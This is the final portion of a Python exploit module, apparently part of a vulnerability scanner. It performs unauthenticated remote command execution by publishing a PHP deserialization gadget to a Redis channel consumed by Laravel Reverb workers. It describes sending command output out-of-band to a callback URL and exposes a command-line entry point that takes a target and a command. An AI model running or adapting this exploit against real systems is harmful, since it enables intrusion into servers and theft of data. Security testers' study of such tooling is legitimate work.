    # file, not back over HTTP, so the TOOL cannot observe it. success stays False (we never saw the
    # output), but this is categorically different from a failure to exploit — the operator just has
    # to read the result out-of-band (OAST/interactsh pane, worker stdout, side-effect file).
    result["oob_pending"] = True
    if oob_read_url:
        _why = (
            "a scanner-polled OOB readback URL was supplied but its response never contained `uid=` "
            "within the poll window"
        )
    elif oob_callback_url:
        _why = (
            f"command output was sent by the target to the OOB callback URL ({oob_callback_url}) "
            "as POST body field d=<base64url(output)>; this scanner cannot read third-party "
            "collector logs directly"
        )
    else:
        _why = "no OOB readback or callback URL was supplied"
    result["reason"] = (
        f"gadget DELIVERED & CONSUMED: published to '{REDIS_CHANNEL}', {n} Reverb subscriber(s) "
        "ran unserialize() on the attacker gadget (CWE-502 sink reached, unauthenticated). The "
        f"gadget's system() output does not return in the original HTTP response, and {_why}, "
        "so the tool did not OBSERVE command output -> success stays False (honest). Verify the "
        "result out-of-band: your OOB collector (e.g. OAST/interactsh), worker stdout, or an "
        "operator-provided side-effect read-back. In realistic Docker or remote setups, "
        "Redis must be reachable from the scanner as an explicit exploit precondition; use "
        "--opt redis_host=<redis-reachable-ip> and --opt redis_port=<reachable-port> when the "
        "default target_host:6379 path is not correct."
    )
    result["detail"] = f"CWE-502 sink reached + gadget consumed ({n} subscriber); verify output out-of-band"
    result["requires"] = ["oob_collector_log"] if oob_callback_url and not oob_read_url else ["oob_read_channel"]
    result["evidence"] = (f"Redis PUBLISH {REDIS_CHANNEL} -> reply {raw!r}; {n} subscriber(s) "
                          f"unserialized the gadget envelope ({len(gadget_serialized)}-byte gadget). "
                          f"Fingerprint: {result['artifacts']['reverb_fingerprint']}")
    return result


if __name__ == "__main__":
    import sys
    print(exploit(sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000",
                  command=sys.argv[2] if len(sys.argv) > 2 else None))
